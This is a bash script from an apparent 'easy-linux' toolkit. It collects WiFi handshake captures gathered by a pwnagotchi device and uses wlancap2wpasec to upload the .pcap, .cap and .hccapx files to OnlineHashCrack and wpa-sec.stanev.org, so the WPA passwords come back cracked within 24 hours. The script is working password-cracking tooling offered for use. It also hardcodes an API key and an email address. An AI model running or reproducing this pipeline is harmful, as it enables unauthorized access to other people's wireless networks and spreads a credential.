#!/bin/bash
# set a variable for handshakes directory so it can be changed in program
# Version: 0.0.2
handshakes_dir=/opt/backup/root/handshakes
scripts_dir=/opt/easy-linux
set -e
# Add Color
source ${scripts_dir}/.envrc
#
trap ${scripts_dir}/support/support-trap-wifi.sh EXIT
source ${scripts_dir}/support/support-Banner_func.sh

printf "  ${CY}This script backs up your saved hashes from ${WT}/opt/backup/root/handshakes${CY}." 

permissions_func() {
# make sure permissions are ok.
if [[ $HOST == "updates" ]]; then 
  pwnagotchi2=Gotcha
  line=$(grep -n "pwnagotchi=" .envrc | cut -d: -f1)
  sed -i "${line}s/.*/pwnagotchi=${pwnagotchi2}/" .envrc

  original_user2=beesoc
  line=$(grep -n "ORIGINAL_USER=" .envrc | cut -d: -f1)
  sed -i "${line}s/.*/original_user=${original_user2}/" .envrc

  sudo chown -vR beesoc:beesoc /opt/backup/root/*
elif [[ $HOST == "lepotato" ]]; then 
  pwnagotchi2=Sniffer
  line=$(grep -n "pwnagotchi=" .envrc | cut -d: -f1)
  sed -i "${line}s/.*/pwnagotchi=${pwnagotchi2}/" .envrc

  original_user2=larry
  line=$(grep -n "ORIGINAL_USER=" .envrc | cut -d: -f1)
  sed -i "${line}s/.*/original_user=${original_user2}/" .envrc

  sudo chown -vR larry:larry /opt/backup/root/*

else 
   sudo chown -vR root:root /opt/backup/root/*
fi
}

folders_exist_func() {
# make sure /opt/backup/root exists
if [[ ! -d /opt/backup/ ]]; then 
   sudo mkdir /opt/backup
fi
if [[ ! -d /opt/backup/root/ ]]; then  
   sudo mkdir /opt/backup/root/
fi
if [[ ! -d "${handshakes_dir}" ]]; then  
   sudo mkdir /opt/backup/root/handshakes
fi
}

## 
upload_func() {
printf " ${GN} [X] ${CY}Gzip is not supported on ${WT}OnlineHashCrack.\\n ${GN} [X] ${CY}Not compressing files. \\n ${GN} [*] ${CY}Uploading pcap's to OHC.${OG}\\n"
wlancap2wpasec -u https://api.onlinehashcrack.com  -e enc.mail.prot@protonmail.com /opt/backup/root/handshakes/*.pcap
printf " ${GN} [*] ${CY}Send all cap's to OHC.${OG}\\n"
wlancap2wpasec -u https://api.onlinehashcrack.com  -e enc.mail.prot@protonmail.com /opt/backup/root/handshakes/*.cap
printf " ${GN} [*] ${WT}Compress all PCAP and CAP files.\\n ${GN} [*] ${CY} Uploading to ${WT}WPA-Stanev${OG}.\\n"
gzip -v -9 --synchronous /opt/backup/root/handshakes/*.pcap
gzip -v -9 --synchronous /opt/backup/root/handshakes/*.cap
printf " ${GN} [*] ${CY}Send all compressed ${WT}pcap's${CY} to ${WT}WPA-Stanev${CY}.\\n ${GN} [*] ${CY}Remove successful uploads.${OG}\\n"
wlancap2wpasec -k ac160b3ccfff2f1d93f5a0ff443061bf -t 45  -R \
/opt/backup/root/handshakes/*.pcap.gz
printf " ${GN} [*] ${CY}Send all compressed ${WT}cap's${CY} to ${WT}WPA-Stanev${CY}.\\n ${GN} [*] ${CY}Remove successful uploads.${OG}\\n"
wlancap2wpasec -k ac160b3ccfff2f1d93f5a0ff443061bf -t 45 \
/opt/backup/root/handshakes/*.cap.gz
printf " ${GN} [X] ${WT}Gzip ${CY}is not supported on ${WT}OnlineHashCrack${CY}.\\n ${GN} [*] ${CY}Uploading ${WT}hccapx ${CY}files to ${WT}OHC.${OG}\\n"
wlancap2wpasec -u https://api.onlinehashcrack.com  -e enc.mail.prot@protonmail.com \
/opt/backup/root/hccapx/*.hccapx
printf " ${GN} [X] ${CY}HCCAPX isn't supported on WPA-Stanev.\\n"
clear
}
main() {
clear
source "${scripts_dir}/support/support-Banner_func.sh"
folders_exist_func
permissions_func
upload_func
}
main
clear
printf "${CY}All Operations completed. Cracked passwords will start appearing on \\n"
printf "https://www.OnlineHashCrack.com and https://wpa-sec.stanev.org within 24hr.\\n"
printf "Press ${WT}any${CY} key to return to ${WT}Main Menu.\\n "
  read -r -n1 -s -t 30
bash ${scripts_dir}/menu-master.sh
